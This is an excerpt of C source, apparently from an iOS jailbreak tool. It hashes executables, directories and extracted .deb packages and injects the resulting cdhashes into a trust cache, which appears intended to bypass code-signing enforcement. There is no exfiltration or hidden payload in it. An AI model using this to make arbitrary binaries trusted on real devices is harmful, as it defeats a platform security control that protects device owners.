    size_t nread = fread(data, 1, st.st_size, f);
    fclose(f);
    if ((off_t)nread != st.st_size) { free(data); return -1; }
    
    uint8_t cdhash[20];
    int ret = compute_cdhash(data, st.st_size, cdhash);
    free(data);
    
    if (ret != 0) return -1;
    
    tlog("trust: %s → cdhash=%02x%02x%02x%02x...", path,
         cdhash[0], cdhash[1], cdhash[2], cdhash[3]);
    
    return tc_add_cdhash(cdhash);
}

int tc_trust_directory(const char *path) {
    if (!g_ready) {
        tlog("trust_directory: trust cache not ready (%s)", path ? path : "(null)");
        return -1;
    }

    if (!path || path[0] == 0) {
        tlog("trust_directory: invalid path");
        return -1;
    }

    DIR *d = opendir(path);
    if (!d) return -1;
    
    int count = 0;
    bool had_error = false;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        
        char full[1024];
        int full_len = snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);
        if (full_len < 0 || full_len >= (int)sizeof(full)) {
            tlog("trust_directory: path too long, skipping %s/%s", path, ent->d_name);
            had_error = true;
            continue;
        }
        
        struct stat st;
        if (lstat(full, &st) != 0) continue;
        if (S_ISLNK(st.st_mode)) {
            tlog("trust_directory: skipping symlink %s", full);
            continue;
        }
        
        if (S_ISDIR(st.st_mode)) {
            int subcount = tc_trust_directory(full);
            if (subcount < 0) {
                had_error = true;
            } else {
                count += subcount;
            }
        } else if (S_ISREG(st.st_mode) && (st.st_mode & S_IXUSR)) {
            /* Only trust executable files */
            if (tc_trust_file(full) == 0) {
                count++;
            } else {
                had_error = true;
            }
        }
    }
    closedir(d);
    
    tlog("trusted %d files in %s", count, path);
    
    /* Flush after directory scan */
    if (g_ready && g_nentries > 0) {
        if (inject_entries() != 0) {
            tlog("trust_directory: inject_entries failed for %s", path);
            return -1;
        }
        g_nentries = 0;
    }

    if (had_error) {
        tlog("trust_directory: one or more entries failed in %s", path);
        return -1;
    }
    
    return count;
}

int tc_trust_deb(const char *deb_path) {
    /* 
     * .deb extraction: ar archive → data.tar.* → files
     * For simplicity, use system() to extract if we're root + unsandboxed.
     * Otherwise, manual ar/tar parsing.
     */
    if (!deb_path || deb_path[0] == 0) {
        tlog("trust_deb: invalid deb path");
        return -1;
    }

    struct stat st;
    if (stat(deb_path, &st) != 0) {
        tlog("trust_deb: stat failed for %s: %s", deb_path, strerror(errno));
        return -1;
    }
    if (!S_ISREG(st.st_mode)) {
        tlog("trust_deb: not a regular file: %s", deb_path);
        return -1;
    }
    if (st.st_size < 8) {
        tlog("trust_deb: deb too small to be valid: %s (%lld bytes)", deb_path, st.st_size);
        return -1;
    }

    tlog("trusting .deb: %s", deb_path);
    
    char tmp_dir[256];
    int tmp_len = snprintf(tmp_dir, sizeof(tmp_dir), "/var/tmp/tc_deb_%d", getpid());
    if (tmp_len < 0 || tmp_len >= (int)sizeof(tmp_dir)) {
        tlog("deb temp dir path truncated");
        return -1;
    }

    char quoted_tmp[520];
    char quoted_deb[2048];
    if (!shell_quote_single(tmp_dir, quoted_tmp, sizeof(quoted_tmp))) {
        tlog("deb temp dir quoting failed");
        return -1;
    }
    if (!shell_quote_single(deb_path, quoted_deb, sizeof(quoted_deb))) {
        tlog("deb path quoting failed for %s", deb_path);
        return -1;
    }
    
    if (cleanup_tmp_dir(tmp_dir, quoted_tmp, "deb pre-cleanup") != 0) {
        return -1;
    }

    char cmd[1024];
    int cmd_len = snprintf(cmd, sizeof(cmd), 
                           "mkdir -p %s && cd %s && ar x %s 2>/dev/null && "
                           "tar xf data.tar.* 2>/dev/null",
                           quoted_tmp, quoted_tmp, quoted_deb);
    if (cmd_len < 0 || cmd_len >= (int)sizeof(cmd)) {
        tlog("deb extraction command truncated for %s", deb_path ? deb_path : "(null)");
        return -1;
    }
    
    int ret = 0;
    {
        pid_t pid;
        char *argv[] = {"/bin/sh", "-c", cmd, NULL};
        extern char **environ;
        if (posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ) == 0) {
            ret = wait_for_child_status(pid, "deb extraction");
        } else { ret = -1; }
    }
    if (ret != 0) {
        tlog("deb extraction failed (ret=%d)", ret);
        cleanup_tmp_dir(tmp_dir, quoted_tmp, "deb failed-extract cleanup");
        return -1;
    }
    
    int count = tc_trust_directory(tmp_dir);

    if (cleanup_tmp_dir(tmp_dir, quoted_tmp, "deb cleanup") != 0) {
        return -1;
    }

    return count;
}
